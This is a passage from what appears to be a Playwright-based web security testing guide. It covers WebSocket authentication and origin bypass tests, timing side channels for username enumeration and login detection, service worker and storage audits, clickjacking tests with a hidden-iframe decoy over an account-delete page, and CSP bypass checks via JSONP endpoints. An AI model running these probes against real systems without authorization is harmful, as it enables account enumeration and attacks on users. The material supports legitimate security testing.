    target_ws_url = "wss://target.example.com/ws"
    
    # Attempt connection without any auth tokens
    try:
        async with websockets.connect(target_ws_url) as ws:
            # Try sending a privileged command without auth
            await ws.send('{"action": "get_users", "admin": true}')
            response = await asyncio.wait_for(ws.recv(), timeout=5)
            print(f"NO AUTH RESPONSE: {response[:200]}")
            if "error" not in response.lower() and "unauthorized" not in response.lower():
                print("CRITICAL: WebSocket accepts commands without authentication")
    except Exception as e:
        print(f"Connection without auth: {e}")
    
    # Test with expired/invalid token
    try:
        headers = {"Cookie": "session=expired_token_abc123"}
        async with websockets.connect(target_ws_url, extra_headers=headers) as ws:
            await ws.send('{"action": "whoami"}')
            response = await asyncio.wait_for(ws.recv(), timeout=5)
            print(f"EXPIRED TOKEN RESPONSE: {response[:200]}")
            if "error" not in response.lower():
                print("WARNING: WebSocket accepts expired session tokens")
    except Exception as e:
        print(f"Expired token test: {e}")

asyncio.run(test_ws_auth_bypass())
```

### WebSocket Origin Validation
```python
# Test if WebSocket server validates Origin header
import websockets
import asyncio

async def test_ws_origin():
    target_ws_url = "wss://target.example.com/ws"
    
    malicious_origins = [
        "https://evil.com",
        "https://target.example.com.evil.com",
        "null",
        "file://",
    ]
    
    for origin in malicious_origins:
        try:
            headers = {"Origin": origin}
            async with websockets.connect(target_ws_url, extra_headers=headers) as ws:
                await ws.send('{"action": "ping"}')
                response = await asyncio.wait_for(ws.recv(), timeout=5)
                print(f"ORIGIN BYPASS [{origin}]: Connection accepted")
                print(f"  Response: {response[:100]}")
        except websockets.exceptions.InvalidStatusCode as e:
            if e.status_code == 403:
                print(f"OK: Origin '{origin}' rejected (403)")
            else:
                print(f"UNEXPECTED: Origin '{origin}' got status {e.status_code}")
        except Exception as e:
            print(f"Origin '{origin}': {type(e).__name__}: {e}")

asyncio.run(test_ws_origin())
```

## Performance-based Side Channel Detection

### Timing Attack on Authentication
```python
import time
import statistics

# Measure response times to detect username enumeration via timing
def measure_login_time(username, password, iterations=10):
    times = []
    for _ in range(iterations):
        ctx = browser.new_context()
        pg = ctx.new_page()
        pg.goto("https://target.example.com/login")
        pg.fill("#username", username)
        pg.fill("#password", password)
        
        start = time.perf_counter()
        pg.click("button[type=submit]")
        pg.wait_for_load_state("networkidle")
        elapsed = time.perf_counter() - start
        
        times.append(elapsed)
        ctx.close()
    
    return {
        "mean": statistics.mean(times),
        "median": statistics.median(times),
        "stdev": statistics.stdev(times) if len(times) > 1 else 0
    }

# Test with valid vs invalid usernames
valid_user = measure_login_time("admin", "wrongpassword")
invalid_user = measure_login_time("nonexistent_user_xyz", "wrongpassword")

diff = abs(valid_user["mean"] - invalid_user["mean"])
print(f"Valid user avg:   {valid_user['mean']:.4f}s (stdev: {valid_user['stdev']:.4f})")
print(f"Invalid user avg: {invalid_user['mean']:.4f}s (stdev: {invalid_user['stdev']:.4f})")
print(f"Timing difference: {diff:.4f}s")

if diff > 0.05:  # 50ms threshold
    print("VULNERABLE: Timing difference suggests username enumeration possible")
```

### Resource Timing API Side Channel
```javascript
// Use Resource Timing API to detect cross-origin state
await page.evaluate(async () => {
    const results = [];
    
    // Test if user is logged into various services via timing
    const targets = [
        'https://target.example.com/api/me',
        'https://target.example.com/admin/status',
        'https://target.example.com/api/notifications',
    ];
    
    for (const url of targets) {
        // Clear performance entries
        performance.clearResourceTimings();
        
        const img = new Image();
        const startTime = performance.now();
        
        await new Promise((resolve) => {
            img.onload = img.onerror = () => {
                const endTime = performance.now();
                const duration = endTime - startTime;
                
                // Check PerformanceResourceTiming
                const entries = performance.getEntriesByName(url);
                const entry = entries[entries.length - 1];
                
                results.push({
                    url: url,
                    duration: duration,
                    transferSize: entry ? entry.transferSize : 'N/A',
                    encodedBodySize: entry ? entry.encodedBodySize : 'N/A',
                });
                resolve();
            };
            img.src = url;
        });
    }
    
    // Analyze timing differences
    results.forEach(r => {
        console.log(`${r.url}: ${r.duration.toFixed(2)}ms (size: ${r.transferSize})`);
    });
    
    return results;
});
```

### Cache Timing Attack
```python
# Detect if resources are cached (indicates prior visit/authentication)
import time

def measure_resource_load(url, iterations=5):
    times = []
    for _ in range(iterations):
        start = time.perf_counter()
        response = page.request.fetch(url)
        elapsed = time.perf_counter() - start
        times.append(elapsed)
        
        # Check cache headers
        cache_control = response.headers.get("cache-control", "")
        age = response.headers.get("age", "")
        x_cache = response.headers.get("x-cache", "")
        
    return {
        "times": times,
        "mean": statistics.mean(times),
        "cache_control": cache_control,
        "x_cache": x_cache,
        "likely_cached": times[-1] < times[0] * 0.5  # Last request much faster
    }

# Test sensitive endpoints for cache-based information leakage
sensitive_urls = [
    "https://target.example.com/api/user/profile",
    "https://target.example.com/api/admin/config",
    "https://target.example.com/static/admin-bundle.js",
]

for url in sensitive_urls:
    result = measure_resource_load(url)
    if result["likely_cached"]:
        print(f"CACHE LEAK: {url}")
        print(f"  First load: {result['times'][0]:.4f}s, Last: {result['times'][-1]:.4f}s")
        print(f"  Cache-Control: {result['cache_control']}")
    if "private" not in result["cache_control"] and "no-store" not in result["cache_control"]:
        print(f"WARNING: {url} missing private/no-store cache directive")
```

### Pixel Timing for Cross-Origin Data Extraction
```javascript
// Detect cross-origin information via rendering timing
await page.evaluate(async () => {
    const findings = [];
    
    // Measure time to render cross-origin iframes (login detection)
    async function measureFrameLoad(url) {
        return new Promise((resolve) => {
            const iframe = document.createElement('iframe');
            iframe.style.cssText = 'width:1px;height:1px;position:absolute;left:-9999px';
            
            const start = performance.now();
            iframe.onload = () => {
                const duration = performance.now() - start;
                document.body.removeChild(iframe);
                resolve(duration);
            };
            iframe.onerror = () => {
                const duration = performance.now() - start;
                document.body.removeChild(iframe);
                resolve(duration);
            };
            
            iframe.src = url;
            document.body.appendChild(iframe);
        });
    }
    
    // Compare load times for authenticated vs public pages
    const authPage = await measureFrameLoad('https://target.example.com/dashboard');
    const publicPage = await measureFrameLoad('https://target.example.com/about');
    
    findings.push({
        test: 'frame_timing',
        authPage: authPage,
        publicPage: publicPage,
        difference: Math.abs(authPage - publicPage)
    });
    
    if (Math.abs(authPage - publicPage) > 100) {
        console.log('SIDE CHANNEL: Significant timing difference between auth/public pages');
        console.log(`  Auth page: ${authPage.toFixed(2)}ms, Public: ${publicPage.toFixed(2)}ms`);
    }
    
    return findings;
});
```

## Service Worker Security Testing

### Service Worker Registration Audit
```python
# Enumerate all registered service workers and their scopes
sw_info = page.evaluate("""async () => {
    const registrations = await navigator.serviceWorker.getRegistrations();
    const result = [];
    for (const reg of registrations) {
        result.push({
            scope: reg.scope,
            updateViaCache: reg.updateViaCache,
            state: reg.active ? reg.active.state : 'none',
            scriptURL: reg.active ? reg.active.scriptURL : 'unknown'
        });
    }
    return result;
}""")

for sw in sw_info:
    print(f"Service Worker: {sw['scriptURL']}")
    print(f"  Scope: {sw['scope']}")
    print(f"  State: {sw['state']}")
    if sw['scope'].endswith('/'):
        print("  WARNING: Broad scope - may intercept requests beyond intended path")
```

### Service Worker Cache Inspection
```python
# Extract all cached responses from Service Worker caches
cached_data = page.evaluate("""async () => {
    const results = [];
    const cacheNames = await caches.keys();
    for (const name of cacheNames) {
        const cache = await caches.open(name);
        const requests = await cache.keys();
        for (const req of requests) {
            const response = await cache.match(req);
            const headers = {};
            response.headers.forEach((v, k) => headers[k] = v);
            results.push({
                cache: name,
                url: req.url,
                status: response.status,
                contentType: headers.get('content-type', 'unknown'),
                cacheControl: headers.get('cache-control', 'none')
            });
        }
    }
    return results;
}""")

for entry in cached_data:
    print(f"[CACHE] {entry['cache']}: {entry['url']}")
    if "private" not in entry.get("cacheControl", "") and "no-store" not in entry.get("cacheControl", ""):
        print(f"  WARNING: Missing private/no-store on cached response")
```

## Clickjacking Detection

### Frame Injection Testing
```python
# Test if target pages can be framed for clickjacking attacks
test_pages = ["/settings", "/profile", "/admin", "/transfer", "/password-change"]

for path in test_pages:
    # Create a page that attempts to iframe the target
    test_html = f"""
    <html><body>
    <iframe id="target" src="https://target.example.com{path}"
            style="position:absolute;top:0;left:0;width:100%;height:100%;border:none;">
    </iframe>
    </body></html>
    """

    # Serve the test page and check if iframe loads
    ctx = browser.new_context()
    pg = ctx.new_page()

    # Listen for frame load events
    frame_loaded = []
    pg.on("framenavigated", lambda frame: frame_loaded.append(frame.url))

    pg.set_content(test_html)
    pg.wait_for_timeout(3000)

    target_frames = [f for f in frame_loaded if path in f]
    if target_frames:
        # Check X-Frame-Options and CSP frame-ancestors
        response = pg.request.fetch(f"https://target.example.com{path}")
        xfo = response.headers.get("x-frame-options", "")
        csp = response.headers.get("content-security-policy", "")
        frame_ancestors = [d for d in csp.split(";") if "frame-ancestors" in d]

        if not xfo and not frame_ancestors:
            print(f"CLICKJACKABLE: {path} - no X-Frame-Options or CSP frame-ancestors")
        elif xfo.upper() == "ALLOWALL" or "*" in str(frame_ancestors):
            print(f"CLICKJACKABLE: {path} - frame protection allows all origins")

    ctx.close()
```

### Drag-and-Drop Clickjacking
```python
# Test drag-and-drop based clickjacking (cursorjacking)
page.set_content("""
<html><body>
<div id="decoy" style="position:absolute;top:50px;left:50px;width:200px;height:40px;
     background:green;color:white;text-align:center;line-height:40px;">
  Click to download report
</div>
<iframe id="target" src="https://target.example.com/account/delete"
        style="position:absolute;top:-500px;left:-500px;width:800px;height:600px;
               opacity:0.01;border:none;">
</iframe>
</body></html>
""")

# Attempt to interact with elements inside the iframe
iframe = page.frame("target")
if iframe:
    # Check if delete button exists and is reachable
    delete_btn = iframe.query_selector("button:has-text('Delete'), input[type=submit]")
    if delete_btn:
        print("CRITICAL: Delete action reachable via drag-and-drop clickjacking")
```

## Browser Storage Security Audit

### Comprehensive Storage Extraction
```python
# Extract all browser storage data for security analysis
storage_audit = page.evaluate("""() => {
    const result = {
        localStorage: {},
        sessionStorage: {},
        cookies: document.cookie,
        indexedDB: []
    };

    // LocalStorage
    for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        result.localStorage[key] = localStorage.getItem(key);
    }

    // SessionStorage
    for (let i = 0; i < sessionStorage.length; i++) {
        const key = sessionStorage.key(i);
        result.sessionStorage[key] = sessionStorage.getItem(key);
    }

    return result;
}""")

# Check for sensitive data patterns
sensitive_patterns = ["password", "token", "secret", "api_key", "credit", "ssn", "auth"]
for storage_type in ["localStorage", "sessionStorage"]:
    for key, value in storage_audit.get(storage_type, {}).items():
        for pattern in sensitive_patterns:
            if pattern in key.lower() or pattern in str(value).lower():
                print(f"SENSITIVE DATA in {storage_type}: {key} = {str(value)[:100]}")
```

### Storage Cleanup Verification on Logout
```python
# Verify all storage is cleared on logout
page.goto("https://target.example.com/login")
page.fill("#username", "testuser")
page.fill("#password", "testpass")
page.click("button[type=submit]")
page.wait_for_url("**/dashboard")

# Record storage state before logout
before_logout = page.evaluate("""() => {
    return {
        localStorageKeys: Object.keys(localStorage),
        sessionStorageKeys: Object.keys(sessionStorage),
        cookieCount: document.cookie.split(';').length
    };
}""")

# Perform logout
page.click("#logout")
page.wait_for_url("**/login")

# Record storage state after logout
after_logout = page.evaluate("""() => {
    return {
        localStorageKeys: Object.keys(localStorage),
        sessionStorageKeys: Object.keys(sessionStorage),
        cookieCount: document.cookie.split(';').length
    };
}""")

# Compare
remaining_ls = set(after_logout["localStorageKeys"]) - set(["theme", "language"])
remaining_ss = set(after_logout["sessionStorageKeys"])
if remaining_ls:
    print(f"WARNING: localStorage not cleared on logout: {remaining_ls}")
if remaining_ss:
    print(f"WARNING: sessionStorage not cleared on logout: {remaining_ss}")
```

## CSP Header Analysis

### CSP Directive Parser
```python
# Parse and evaluate Content-Security-Policy headers
from urllib.parse import urlparse
import re

def analyze_csp(csp_header):
    """Parse CSP header and identify security weaknesses."""
    directives = {}
    for directive in csp_header.split(";"):
        parts = directive.strip().split()
        if parts:
            name = parts[0]
            values = parts[1:] if len(parts) > 1 else ["'none'"]
            directives[name] = values

    findings = []

    # Check for missing default-src
    if "default-src" not in directives:
        findings.append("HIGH: Missing default-src directive")

    # Check for unsafe-inline
    for directive, values in directives.items():
        if "'unsafe-inline'" in values:
            findings.append(f"HIGH: {directive} contains 'unsafe-inline'")
        if "'unsafe-eval'" in values:
            findings.append(f"HIGH: {directive} contains 'unsafe-eval'")
        if "*" in values:
            findings.append(f"MEDIUM: {directive} uses wildcard '*'")

    # Check for frame-ancestors (clickjacking protection)
    if "frame-ancestors" not in directives:
        findings.append("MEDIUM: Missing frame-ancestors directive")

    # Check for upgrade-insecure-requests
    if "upgrade-insecure-requests" not in directives:
        findings.append("LOW: Missing upgrade-insecure-requests directive")

    return {"directives": directives, "findings": findings}

# Collect CSP from all pages
pages_to_check = ["/", "/login", "/dashboard", "/settings", "/api/config"]
for path in pages_to_check:
    response = page.request.fetch(f"https://target.example.com{path}")
    csp = response.headers.get("content-security-policy", "")
    if not csp:
        print(f"CRITICAL: No CSP header on {path}")
    else:
        result = analyze_csp(csp)
        if result["findings"]:
            print(f"CSP issues on {path}:")
            for f in result["findings"]:
                print(f"  {f}")
```

### CSP Bypass via JSONP and Trusted CDNs
```python
# Test if CSP can be bypassed using JSONP endpoints on whitelisted domains
# Common JSONP endpoints on trusted CDNs
jsonp_endpoints = [
    "https://accounts.google.com/o/oauth2/revoke?callback=alert",
    "https://api.github.com?callback=alert",
    "https://www.googleapis.com/customsearch/v1?callback=alert",
    "https://ajax.googleapis.com/ajax/services/feed/load?callback=alert",
    "https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js",
]

page.goto("https://target.example.com")
csp_header = ""
def capture_csp(response):
    global csp_header
    csp_header = response.headers.get("content-security-policy", "")
page.on("response", capture_csp)
page.reload()

# Parse script-src from CSP
script_src = ""
for directive in csp_header.split(";"):
    if directive.strip().startswith("script-src"):
        script_src = directive.strip()
        break

if script_src:
    print(f"Script-SRC: {script_src}")
    for endpoint in jsonp_endpoints:
        domain = endpoint.split("/")[2]
        if domain in script_src:
            print(f"POTENTIAL BYPASS: {domain} is whitelisted and has JSONP: {endpoint}")
```
